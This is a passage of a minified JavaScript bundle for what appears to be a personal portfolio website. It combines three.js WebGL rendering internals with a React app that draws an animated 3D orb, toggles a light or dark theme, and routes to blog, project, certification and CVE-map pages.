otLightMap,Ce.pointShadowMap.value=B.state.pointShadowMap,Ce.pointShadowMatrix.value=B.state.pointShadowMatrix),W.currentProgram=Pe,W.uniformsList=null,Pe}function Sh(M){if(M.uniformsList===null){const U=M.currentProgram.getUniforms();M.uniformsList=ol.seqWithValue(U.seq,M.uniforms)}return M.uniformsList}function bh(M,U){const j=x.get(M);j.outputColorSpace=U.outputColorSpace,j.batching=U.batching,j.batchingColor=U.batchingColor,j.instancing=U.instancing,j.instancingColor=U.instancingColor,j.instancingMorph=U.instancingMorph,j.skinning=U.skinning,j.morphTargets=U.morphTargets,j.morphNormals=U.morphNormals,j.morphColors=U.morphColors,j.morphTargetsCount=U.morphTargetsCount,j.numClippingPlanes=U.numClippingPlanes,j.numIntersection=U.numClipIntersection,j.vertexAlphas=U.vertexAlphas,j.vertexTangents=U.vertexTangents,j.toneMapping=U.toneMapping}function s_(M,U,j,W,B){U.isScene!==!0&&(U=at),D.resetTextureUnits();const de=U.fog,ge=W.isMeshStandardMaterial?U.environment:null,he=V===null?w.outputColorSpace:V.isXRRenderTarget===!0?V.texture.colorSpace:Dr,xe=(W.isMeshStandardMaterial?ee:$).get(W.envMap||ge),Ae=W.vertexColors===!0&&!!j.attributes.color&&j.attributes.color.itemSize===4,Pe=!!j.attributes.tangent&&(!!W.normalMap||W.anisotropy>0),Ce=!!j.morphAttributes.position,ze=!!j.morphAttributes.normal,rt=!!j.morphAttributes.color;let _t=ai;W.toneMapped&&(V===null||V.isXRRenderTarget===!0)&&(_t=w.toneMapping);const xt=j.morphAttributes.position||j.morphAttributes.normal||j.morphAttributes.color,ot=xt!==void 0?xt.length:0,Re=x.get(W),nt=T.state.lights;if(be===!0&&(qe===!0||M!==O)){const Zt=M===O&&W.id===Z;Se.setState(W,M,Zt)}let Ye=!1;W.version===Re.__version?(Re.needsLights&&Re.lightsStateVersion!==nt.state.version||Re.outputColorSpace!==he||B.isBatchedMesh&&Re.batching===!1||!B.isBatchedMesh&&Re.batching===!0||B.isBatchedMesh&&Re.batchingColor===!0&&B.colorTexture===null||B.isBatchedMesh&&Re.batchingColor===!1&&B.colorTexture!==null||B.isInstancedMesh&&Re.instancing===!1||!B.isInstancedMesh&&Re.instancing===!0||B.isSkinnedMesh&&Re.skinning===!1||!B.isSkinnedMesh&&Re.skinning===!0||B.isInstancedMesh&&Re.instancingColor===!0&&B.instanceColor===null||B.isInstancedMesh&&Re.instancingColor===!1&&B.instanceColor!==null||B.isInstancedMesh&&Re.instancingMorph===!0&&B.morphTexture===null||B.isInstancedMesh&&Re.instancingMorph===!1&&B.morphTexture!==null||Re.envMap!==xe||W.fog===!0&&Re.fog!==de||Re.numClippingPlanes!==void 0&&(Re.numClippingPlanes!==Se.numPlanes||Re.numIntersection!==Se.numIntersection)||Re.vertexAlphas!==Ae||Re.vertexTangents!==Pe||Re.morphTargets!==Ce||Re.morphNormals!==ze||Re.morphColors!==rt||Re.toneMapping!==_t||Re.morphTargetsCount!==ot)&&(Ye=!0):(Ye=!0,Re.__version=W.version);let fn=Re.currentProgram;Ye===!0&&(fn=ro(W,U,B));let Hs=!1,mn=!1,Gr=!1;const ut=fn.getUniforms(),rn=Re.uniforms;if(Ee.useProgram(fn.program)&&(Hs=!0,mn=!0,Gr=!0),W.id!==Z&&(Z=W.id,mn=!0),Hs||O!==M){Ee.buffers.depth.getReversed()&&M.reversedDepth!==!0&&(M._reversedDepth=!0,M.updateProjectionMatrix()),ut.setValue(k,"projectionMatrix",M.projectionMatrix),ut.setValue(k,"viewMatrix",M.matrixWorldInverse);const an=ut.map.cameraPosition;an!==void 0&&an.setValue(k,Ge.setFromMatrixPosition(M.matrixWorld)),lt.logarithmicDepthBuffer&&ut.setValue(k,"logDepthBufFC",2/(Math.log(M.far+1)/Math.LN2)),(W.isMeshPhongMaterial||W.isMeshToonMaterial||W.isMeshLambertMaterial||W.isMeshBasicMaterial||W.isMeshStandardMaterial||W.isShaderMaterial)&&ut.setValue(k,"isOrthographic",M.isOrthographicCamera===!0),O!==M&&(O=M,mn=!0,Gr=!0)}if(Re.needsLights&&(nt.state.directionalShadowMap.length>0&&ut.setValue(k,"directionalShadowMap",nt.state.directionalShadowMap,D),nt.state.spotShadowMap.length>0&&ut.setValue(k,"spotShadowMap",nt.state.spotShadowMap,D),nt.state.pointShadowMap.length>0&&ut.setValue(k,"pointShadowMap",nt.state.pointShadowMap,D)),B.isSkinnedMesh){ut.setOptional(k,B,"bindMatrix"),ut.setOptional(k,B,"bindMatrixInverse");const Zt=B.skeleton;Zt&&(Zt.boneTexture===null&&Zt.computeBoneTexture(),ut.setValue(k,"boneTexture",Zt.boneTexture,D))}B.isBatchedMesh&&(ut.setOptional(k,B,"batchingTexture"),ut.setValue(k,"batchingTexture",B._matricesTexture,D),ut.setOptional(k,B,"batchingIdTexture"),ut.setValue(k,"batchingIdTexture",B._indirectTexture,D),ut.setOptional(k,B,"batchingColorTexture"),B._colorsTexture!==null&&ut.setValue(k,"batchingColorTexture",B._colorsTexture,D));const Tn=j.morphAttributes;if((Tn.position!==void 0||Tn.normal!==void 0||Tn.color!==void 0)&&Be.update(B,j,fn),(mn||Re.receiveShadow!==B.receiveShadow)&&(Re.receiveShadow=B.receiveShadow,ut.setValue(k,"receiveShadow",B.receiveShadow)),W.isMeshGouraudMaterial&&W.envMap!==null&&(rn.envMap.value=xe,rn.flipEnvMap.value=xe.isCubeTexture&&xe.isRenderTargetTexture===!1?-1:1),W.isMeshStandardMaterial&&W.envMap===null&&U.environment!==null&&(rn.envMapIntensity.value=U.environmentIntensity),rn.dfgLUT!==void 0&&(rn.dfgLUT.value=KA()),mn&&(ut.setValue(k,"toneMappingExposure",w.toneMappingExposure),Re.needsLights&&r_(rn,Gr),de&&W.fog===!0&&ke.refreshFogUniforms(rn,de),ke.refreshMaterialUniforms(rn,W,Le,ye,T.state.transmissionRenderTarget[M.id]),ol.upload(k,Sh(Re),rn,D)),W.isShaderMaterial&&W.uniformsNeedUpdate===!0&&(ol.upload(k,Sh(Re),rn,D),W.uniformsNeedUpdate=!1),W.isSpriteMaterial&&ut.setValue(k,"center",B.center),ut.setValue(k,"modelViewMatrix",B.modelViewMatrix),ut.setValue(k,"normalMatrix",B.normalMatrix),ut.setValue(k,"modelMatrix",B.matrixWorld),W.isShaderMaterial||W.isRawShaderMaterial){const Zt=W.uniformsGroups;for(let an=0,ac=Zt.length;an<ac;an++){const fs=Zt[an];ie.update(fs,fn),ie.bind(fs,fn)}}return fn}function r_(M,U){M.ambientLightColor.needsUpdate=U,M.lightProbe.needsUpdate=U,M.directionalLights.needsUpdate=U,M.directionalLightShadows.needsUpdate=U,M.pointLights.needsUpdate=U,M.pointLightShadows.needsUpdate=U,M.spotLights.needsUpdate=U,M.spotLightShadows.needsUpdate=U,M.rectAreaLights.needsUpdate=U,M.hemisphereLights.needsUpdate=U}function a_(M){return M.isMeshLambertMaterial||M.isMeshToonMaterial||M.isMeshPhongMaterial||M.isMeshStandardMaterial||M.isShadowMaterial||M.isShaderMaterial&&M.lights===!0}this.getActiveCubeFace=function(){return P},this.getActiveMipmapLevel=function(){return G},this.getRenderTarget=function(){return V},this.setRenderTargetTextures=function(M,U,j){const W=x.get(M);W.__autoAllocateDepthBuffer=M.resolveDepthBuffer===!1,W.__autoAllocateDepthBuffer===!1&&(W.__useRenderToTexture=!1),x.get(M.texture).__webglTexture=U,x.get(M.depthTexture).__webglTexture=W.__autoAllocateDepthBuffer?void 0:j,W.__hasExternalTextures=!0},this.setRenderTargetFramebuffer=function(M,U){const j=x.get(M);j.__webglFramebuffer=U,j.__useDefaultFramebuffer=U===void 0};const o_=k.createFramebuffer();this.setRenderTarget=function(M,U=0,j=0){V=M,P=U,G=j;let W=null,B=!1,de=!1;if(M){const he=x.get(M);if(he.__useDefaultFramebuffer!==void 0){Ee.bindFramebuffer(k.FRAMEBUFFER,he.__webglFramebuffer),z.copy(M.viewport),F.copy(M.scissor),I=M.scissorTest,Ee.viewport(z),Ee.scissor(F),Ee.setScissorTest(I),Z=-1;return}else if(he.__webglFramebuffer===void 0)D.setupRenderTarget(M);else if(he.__hasExternalTextures)D.rebindTextures(M,x.get(M.texture).__webglTexture,x.get(M.depthTexture).__webglTexture);else if(M.depthBuffer){const Pe=M.depthTexture;if(he.__boundDepthTexture!==Pe){if(Pe!==null&&x.has(Pe)&&(M.width!==Pe.image.width||M.height!==Pe.image.height))throw new Error("WebGLRenderTarget: Attached DepthTexture is initialized to the incorrect size.");D.setupDepthRenderbuffer(M)}}const xe=M.texture;(xe.isData3DTexture||xe.isDataArrayTexture||xe.isCompressedArrayTexture)&&(de=!0);const Ae=x.get(M).__webglFramebuffer;M.isWebGLCubeRenderTarget?(Array.isArray(Ae[U])?W=Ae[U][j]:W=Ae[U],B=!0):M.samples>0&&D.useMultisampledRTT(M)===!1?W=x.get(M).__webglMultisampledFramebuffer:Array.isArray(Ae)?W=Ae[j]:W=Ae,z.copy(M.viewport),F.copy(M.scissor),I=M.scissorTest}else z.copy(Y).multiplyScalar(Le).floor(),F.copy(te).multiplyScalar(Le).floor(),I=_e;if(j!==0&&(W=o_),Ee.bindFramebuffer(k.FRAMEBUFFER,W)&&Ee.drawBuffers(M,W),Ee.viewport(z),Ee.scissor(F),Ee.setScissorTest(I),B){const he=x.get(M.texture);k.framebufferTexture2D(k.FRAMEBUFFER,k.COLOR_ATTACHMENT0,k.TEXTURE_CUBE_MAP_POSITIVE_X+U,he.__webglTexture,j)}else if(de){const he=U;for(let xe=0;xe<M.textures.length;xe++){const Ae=x.get(M.textures[xe]);k.framebufferTextureLayer(k.FRAMEBUFFER,k.COLOR_ATTACHMENT0+xe,Ae.__webglTexture,j,he)}}else if(M!==null&&j!==0){const he=x.get(M.texture);k.framebufferTexture2D(k.FRAMEBUFFER,k.COLOR_ATTACHMENT0,k.TEXTURE_2D,he.__webglTexture,j)}Z=-1},this.readRenderTargetPixels=function(M,U,j,W,B,de,ge,he=0){if(!(M&&M.isWebGLRenderTarget)){$e("WebGLRenderer.readRenderTargetPixels: renderTarget is not THREE.WebGLRenderTarget.");return}let xe=x.get(M).__webglFramebuffer;if(M.isWebGLCubeRenderTarget&&ge!==void 0&&(xe=xe[ge]),xe){Ee.bindFramebuffer(k.FRAMEBUFFER,xe);try{const Ae=M.textures[he],Pe=Ae.format,Ce=Ae.type;if(!lt.textureFormatReadable(Pe)){$e("WebGLRenderer.readRenderTargetPixels: renderTarget is not in RGBA or implementation defined format.");return}if(!lt.textureTypeReadable(Ce)){$e("WebGLRenderer.readRenderTargetPixels: renderTarget is not in UnsignedByteType or implementation defined type.");return}U>=0&&U<=M.width-W&&j>=0&&j<=M.height-B&&(M.textures.length>1&&k.readBuffer(k.COLOR_ATTACHMENT0+he),k.readPixels(U,j,W,B,ae.convert(Pe),ae.convert(Ce),de))}finally{const Ae=V!==null?x.get(V).__webglFramebuffer:null;Ee.bindFramebuffer(k.FRAMEBUFFER,Ae)}}},this.readRenderTargetPixelsAsync=async function(M,U,j,W,B,de,ge,he=0){if(!(M&&M.isWebGLRenderTarget))throw new Error("THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not THREE.WebGLRenderTarget.");let xe=x.get(M).__webglFramebuffer;if(M.isWebGLCubeRenderTarget&&ge!==void 0&&(xe=xe[ge]),xe)if(U>=0&&U<=M.width-W&&j>=0&&j<=M.height-B){Ee.bindFramebuffer(k.FRAMEBUFFER,xe);const Ae=M.textures[he],Pe=Ae.format,Ce=Ae.type;if(!lt.textureFormatReadable(Pe))throw new Error("THREE.WebGLRenderer.readRenderTargetPixelsAsync: renderTarget is not in RGBA or implementation defined format.");if(!lt.textureTypeReadable(Ce))throw new Error("THREE.WebGLRenderer.readRenderTargetPixelsAsync: renderTarget is not in UnsignedByteType or implementation defined type.");const ze=k.createBuffer();k.bindBuffer(k.PIXEL_PACK_BUFFER,ze),k.bufferData(k.PIXEL_PACK_BUFFER,de.byteLength,k.STREAM_READ),M.textures.length>1&&k.readBuffer(k.COLOR_ATTACHMENT0+he),k.readPixels(U,j,W,B,ae.convert(Pe),ae.convert(Ce),0);const rt=V!==null?x.get(V).__webglFramebuffer:null;Ee.bindFramebuffer(k.FRAMEBUFFER,rt);const _t=k.fenceSync(k.SYNC_GPU_COMMANDS_COMPLETE,0);return k.flush(),await pw(k,_t,4),k.bindBuffer(k.PIXEL_PACK_BUFFER,ze),k.getBufferSubData(k.PIXEL_PACK_BUFFER,0,de),k.deleteBuffer(ze),k.deleteSync(_t),de}else throw new Error("THREE.WebGLRenderer.readRenderTargetPixelsAsync: requested read bounds are out of range.")},this.copyFramebufferToTexture=function(M,U=null,j=0){const W=Math.pow(2,-j),B=Math.floor(M.image.width*W),de=Math.floor(M.image.height*W),ge=U!==null?U.x:0,he=U!==null?U.y:0;D.setTexture2D(M,0),k.copyTexSubImage2D(k.TEXTURE_2D,j,0,0,ge,he,B,de),Ee.unbindTexture()};const l_=k.createFramebuffer(),c_=k.createFramebuffer();this.copyTextureToTexture=function(M,U,j=null,W=null,B=0,de=null){de===null&&(B!==0?(Wa("WebGLRenderer: copyTextureToTexture function signature has changed to support src and dst mipmap levels."),de=B,B=0):de=0);let ge,he,xe,Ae,Pe,Ce,ze,rt,_t;const xt=M.isCompressedTexture?M.mipmaps[de]:M.image;if(j!==null)ge=j.max.x-j.min.x,he=j.max.y-j.min.y,xe=j.isBox3?j.max.z-j.min.z:1,Ae=j.min.x,Pe=j.min.y,Ce=j.isBox3?j.min.z:0;else{const Tn=Math.pow(2,-B);ge=Math.floor(xt.width*Tn),he=Math.floor(xt.height*Tn),M.isDataArrayTexture?xe=xt.depth:M.isData3DTexture?xe=Math.floor(xt.depth*Tn):xe=1,Ae=0,Pe=0,Ce=0}W!==null?(ze=W.x,rt=W.y,_t=W.z):(ze=0,rt=0,_t=0);const ot=ae.convert(U.format),Re=ae.convert(U.type);let nt;U.isData3DTexture?(D.setTexture3D(U,0),nt=k.TEXTURE_3D):U.isDataArrayTexture||U.isCompressedArrayTexture?(D.setTexture2DArray(U,0),nt=k.TEXTURE_2D_ARRAY):(D.setTexture2D(U,0),nt=k.TEXTURE_2D),k.pixelStorei(k.UNPACK_FLIP_Y_WEBGL,U.flipY),k.pixelStorei(k.UNPACK_PREMULTIPLY_ALPHA_WEBGL,U.premultiplyAlpha),k.pixelStorei(k.UNPACK_ALIGNMENT,U.unpackAlignment);const Ye=k.getParameter(k.UNPACK_ROW_LENGTH),fn=k.getParameter(k.UNPACK_IMAGE_HEIGHT),Hs=k.getParameter(k.UNPACK_SKIP_PIXELS),mn=k.getParameter(k.UNPACK_SKIP_ROWS),Gr=k.getParameter(k.UNPACK_SKIP_IMAGES);k.pixelStorei(k.UNPACK_ROW_LENGTH,xt.width),k.pixelStorei(k.UNPACK_IMAGE_HEIGHT,xt.height),k.pixelStorei(k.UNPACK_SKIP_PIXELS,Ae),k.pixelStorei(k.UNPACK_SKIP_ROWS,Pe),k.pixelStorei(k.UNPACK_SKIP_IMAGES,Ce);const ut=M.isDataArrayTexture||M.isData3DTexture,rn=U.isDataArrayTexture||U.isData3DTexture;if(M.isDepthTexture){const Tn=x.get(M),Zt=x.get(U),an=x.get(Tn.__renderTarget),ac=x.get(Zt.__renderTarget);Ee.bindFramebuffer(k.READ_FRAMEBUFFER,an.__webglFramebuffer),Ee.bindFramebuffer(k.DRAW_FRAMEBUFFER,ac.__webglFramebuffer);for(let fs=0;fs<xe;fs++)ut&&(k.framebufferTextureLayer(k.READ_FRAMEBUFFER,k.COLOR_ATTACHMENT0,x.get(M).__webglTexture,B,Ce+fs),k.framebufferTextureLayer(k.DRAW_FRAMEBUFFER,k.COLOR_ATTACHMENT0,x.get(U).__webglTexture,de,_t+fs)),k.blitFramebuffer(Ae,Pe,ge,he,ze,rt,ge,he,k.DEPTH_BUFFER_BIT,k.NEAREST);Ee.bindFramebuffer(k.READ_FRAMEBUFFER,null),Ee.bindFramebuffer(k.DRAW_FRAMEBUFFER,null)}else if(B!==0||M.isRenderTargetTexture||x.has(M)){const Tn=x.get(M),Zt=x.get(U);Ee.bindFramebuffer(k.READ_FRAMEBUFFER,l_),Ee.bindFramebuffer(k.DRAW_FRAMEBUFFER,c_);for(let an=0;an<xe;an++)ut?k.framebufferTextureLayer(k.READ_FRAMEBUFFER,k.COLOR_ATTACHMENT0,Tn.__webglTexture,B,Ce+an):k.framebufferTexture2D(k.READ_FRAMEBUFFER,k.COLOR_ATTACHMENT0,k.TEXTURE_2D,Tn.__webglTexture,B),rn?k.framebufferTextureLayer(k.DRAW_FRAMEBUFFER,k.COLOR_ATTACHMENT0,Zt.__webglTexture,de,_t+an):k.framebufferTexture2D(k.DRAW_FRAMEBUFFER,k.COLOR_ATTACHMENT0,k.TEXTURE_2D,Zt.__webglTexture,de),B!==0?k.blitFramebuffer(Ae,Pe,ge,he,ze,rt,ge,he,k.COLOR_BUFFER_BIT,k.NEAREST):rn?k.copyTexSubImage3D(nt,de,ze,rt,_t+an,Ae,Pe,ge,he):k.copyTexSubImage2D(nt,de,ze,rt,Ae,Pe,ge,he);Ee.bindFramebuffer(k.READ_FRAMEBUFFER,null),Ee.bindFramebuffer(k.DRAW_FRAMEBUFFER,null)}else rn?M.isDataTexture||M.isData3DTexture?k.texSubImage3D(nt,de,ze,rt,_t,ge,he,xe,ot,Re,xt.data):U.isCompressedArrayTexture?k.compressedTexSubImage3D(nt,de,ze,rt,_t,ge,he,xe,ot,xt.data):k.texSubImage3D(nt,de,ze,rt,_t,ge,he,xe,ot,Re,xt):M.isDataTexture?k.texSubImage2D(k.TEXTURE_2D,de,ze,rt,ge,he,ot,Re,xt.data):M.isCompressedTexture?k.compressedTexSubImage2D(k.TEXTURE_2D,de,ze,rt,xt.width,xt.height,ot,xt.data):k.texSubImage2D(k.TEXTURE_2D,de,ze,rt,ge,he,ot,Re,xt);k.pixelStorei(k.UNPACK_ROW_LENGTH,Ye),k.pixelStorei(k.UNPACK_IMAGE_HEIGHT,fn),k.pixelStorei(k.UNPACK_SKIP_PIXELS,Hs),k.pixelStorei(k.UNPACK_SKIP_ROWS,mn),k.pixelStorei(k.UNPACK_SKIP_IMAGES,Gr),de===0&&U.generateMipmaps&&k.generateMipmap(nt),Ee.unbindTexture()},this.initRenderTarget=function(M){x.get(M).__webglFramebuffer===void 0&&D.setupRenderTarget(M)},this.initTexture=function(M){M.isCubeTexture?D.setTextureCube(M,0):M.isData3DTexture?D.setTexture3D(M,0):M.isDataArrayTexture||M.isCompressedArrayTexture?D.setTexture2DArray(M,0):D.setTexture2D(M,0),Ee.unbindTexture()},this.resetState=function(){P=0,G=0,V=null,Ee.reset(),me.reset()},typeof __THREE_DEVTOOLS__<"u"&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("observe",{detail:this}))}get coordinateSystem(){return ii}get outputColorSpace(){return this._outputColorSpace}set outputColorSpace(e){this._outputColorSpace=e;const n=this.getContext();n.drawingBufferColorSpace=We._getDrawingBufferColorSpace(e),n.unpackColorSpace=We._getUnpackColorSpace()}}const Gm={light:{base:"#f1f0ec",hot:"#facb0e",warm:"#ff642f",cool:"#78bae6",accent:"#f06ba8"},dark:{base:"#1d1d1d",hot:"#facb0e",warm:"#ff642f",cool:"#78bae6",accent:"#f06ba8"}};function JA(){const t=Q.useRef(null);return Q.useEffect(()=>{const e=t.current;if(!e)return;const n=new ZA({canvas:e,antialias:!0,alpha:!0,powerPreference:"high-performance"});n.setPixelRatio(Math.min(window.devicePixelRatio||1,2)),n.setClearColor(0,0);const i=new Fw,s=new xn(35,1,.1,100);s.position.set(0,0,7);const r=new ua;i.add(r);const a=document.createElement("canvas");a.width=512,a.height=512;const o=a.getContext("2d");if(!o){n.dispose();return}const l=new Gw(a);l.wrapS=Va,l.wrapT=Va,l.center.set(.5,.5);const c=new Xw({map:l,emissiveMap:l,emissive:new je("#ffffff"),emissiveIntensity:.6,metalness:.15,roughness:.3,transparent:!0,opacity:.95}),p=new Nn(new ph(2.1,128,128),c);r.add(p);const d=new uh({color:new je("#1d1d1d"),transparent:!0,opacity:.22}),h=new Nn(new Ul(2.9,.02,16,180),d);h.rotation.set(Math.PI*.4,Math.PI*.15,0),r.add(h);const f=new Nn(new Ul(3.25,.015,16,180),d.clone());f.rotation.set(Math.PI*.9,Math.PI*.2,.2),f.material.opacity=.14,r.add(f);const v=new Qw(16777215,.65),y=new Jw(16777215,.5);y.position.set(4,2,5);const m=new Kw(16737327,.45,20);m.position.set(-6,1,6),i.add(v,y,m);const u=E=>{const P=a.width;o.clearRect(0,0,P,P),o.fillStyle=E.base,o.fillRect(0,0,P,P);const G=o.createRadialGradient(P*.28,P*.28,P*.1,P*.55,P*.55,P*.6);G.addColorStop(0,E.hot),G.addColorStop(.35,E.warm),G.addColorStop(.7,E.cool),G.addColorStop(1,"rgba(0,0,0,0)"),o.globalCompositeOperation="screen",o.fillStyle=G,o.fillRect(0,0,P,P);const V=o.createRadialGradient(P*.75,P*.2,P*.08,P*.7,P*.2,P*.45);V.addColorStop(0,E.accent),V.addColorStop(1,"rgba(0,0,0,0)"),o.fillStyle=V,o.fillRect(0,0,P,P),o.globalCompositeOperation="source-over",l.needsUpdate=!0},g=()=>{const E=document.body.classList.contains("dark");u(E?Gm.dark:Gm.light),c.emissiveIntensity=E?.45:.6,c.opacity=E?.88:.95,h.material.color.set(E?"#e5e4e0":"#1d1d1d"),h.material.opacity=E?.26:.22,f.material.color.set(E?"#e5e4e0":"#1d1d1d"),f.material.opacity=E?.18:.14,v.intensity=E?.45:.65,m.intensity=E?.35:.45};let _=2.1,b=1.2;const T=()=>{const E=window.innerWidth,P=window.innerHeight;n.setSize(E,P,!1),s.aspect=E/P,s.updateProjectionMatrix();const G=E/P>1.05,V=G?1:.82;r.scale.setScalar(V),_=G?2.1:1.3,b=G?1.2:.6,r.position.set(_,b,0)};T(),g();const A=new MutationObserver(g);A.observe(document.body,{attributes:!0,attributeFilter:["class"]}),window.addEventListener("resize",T);let C=0;const L=new tE,w=()=>{const E=L.getElapsedTime();p.rotation.y=E*.18,p.rotation.x=Math.sin(E*.2)*.08,h.rotation.z=E*.08,f.rotation.z=-E*.06,r.position.y=b+Math.sin(E*.3)*.08,l.rotation=Math.sin(E*.08)*.04,l.offset.set(Math.sin(E*.03)*.02,Math.cos(E*.04)*.02),n.render(i,s),C=requestAnimationFrame(w)};return w(),()=>{window.removeEventListener("resize",T),A.disconnect(),C&&cancelAnimationFrame(C),p.geometry.dispose(),c.dispose(),l.dispose(),h.geometry.dispose(),d.dispose(),f.geometry.dispose(),f.material.dispose(),n.dispose()}},[]),S.jsx("div",{className:"orb-field","aria-hidden":"true",children:S.jsx("canvas",{ref:t,className:"orb-canvas"})})}function QA(){const[t,e]=Q.useState(()=>typeof window>"u"?"light":localStorage.getItem("theme")||"light");return Q.useEffect(()=>{const i=document.body;i.classList.remove("light","dark"),i.classList.add(t),localStorage.setItem("theme",t)},[t]),{theme:t,toggleTheme:()=>{e(i=>i==="light"?"dark":"light")}}}function eC(){const{theme:t,toggleTheme:e}=QA();return S.jsx(FS,{children:S.jsxs("div",{className:"app-shell",children:[S.jsx(JA,{}),S.jsx(Lb,{}),S.jsx(Pb,{}),S.jsx(HS,{onToggleTheme:e,theme:t}),S.jsx("main",{children:S.jsxs(kS,{children:[S.jsx(Vi,{path:"/",element:S.jsx(Gf,{})}),S.jsx(Vi,{path:"/blogs",element:S.jsx(ib,{})}),S.jsx(Vi,{path:"/projects",element:S.jsx(bb,{})}),S.jsx(Vi,{path:"/certifications",element:S.jsx(wb,{})}),S.jsx(Vi,{path:"/blog/:slug",element:S.jsx(Sb,{})}),S.jsx(Vi,{path:"/cve-map",element:S.jsx(Cb,{})}),S.jsx(Vi,{path:"*",element:S.jsx(Gf,{})})]})}),S.jsx(Rb,{}),S.jsx(XS,{}),S.jsx(kb,{})]})})}i0(document.getElementById("root")).render(S.jsx(eg.StrictMode,{children:S.jsx(eC,{})}));
